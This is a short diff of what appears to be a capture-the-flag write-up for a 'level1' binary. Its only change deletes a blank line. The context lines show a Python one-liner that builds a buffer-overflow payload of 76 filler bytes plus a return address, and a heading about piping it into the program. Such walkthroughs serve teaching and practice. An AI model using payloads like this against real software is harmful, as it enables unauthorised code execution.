@@ -194,7 +194,6 @@ Create the exploit:
 ```bash
 python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
 ```
-
 ### 5. Execute the Exploit
 
 Now, execute the exploit by piping the input into the `level1` program:
